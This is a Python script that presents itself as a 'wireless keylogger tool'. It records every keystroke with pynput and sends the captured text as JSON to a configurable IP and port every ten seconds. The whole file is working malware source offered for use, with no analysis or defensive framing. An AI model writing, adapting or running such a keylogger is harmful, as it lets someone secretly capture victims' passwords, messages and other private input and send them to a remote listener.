from pynput.keyboard import Key, Listener
from socket import gethostbyname, gethostname
from argparse import ArgumentParser
from requests import post
import json
from threading import Timer

text = ""

parser = ArgumentParser(description="A wireless keylogger tool built in Python!",usage="python3 %(prog)s")

parser.add_argument("-ip", "--ip",
                    metavar="ip",
                    help="enter your ip address")

parser.add_argument("-p", "--port",
                    metavar="port",
                    help="enter your port number")

args = parser.parse_args()

ip = args.ip
port = args.port

if (ip == None):
    ip = gethostbyname(gethostname())

if (port == None):
    port = 8080

print(ip, port)

def post_request():
    try:
        payload = json.dumps(
            {"keyboardData": text}
        )

        req = post(
            f"http://{ip}:{port}",
            data = payload,
            headers = {
                "Content-Type": "application/json"
            }
        )

        timer = Timer(10, post_request)

        timer.start()

    except:
        print("Something wrong happening in system")

def on_press(key):
    global text

    if key == Key.enter:
        text += "\n"

    elif key == Key.tab:
        text += "\t"

    elif key == Key.space:
        text += " "

    elif key == Key.backspace and len(text) > 0:
        text = text[:-1]

    elif key == Key.shift or \
        key == Key.ctrl_l or \
        key == Key.ctrl_r or \
        key == Key.esc or \
        (key == Key.backspace and len(text) == 0) :
        pass

    else:
        text += str(key).strip("'")



if __name__ == "__main__":
    with Listener(on_press=on_press) as listener:
        post_request()
        listener.join()



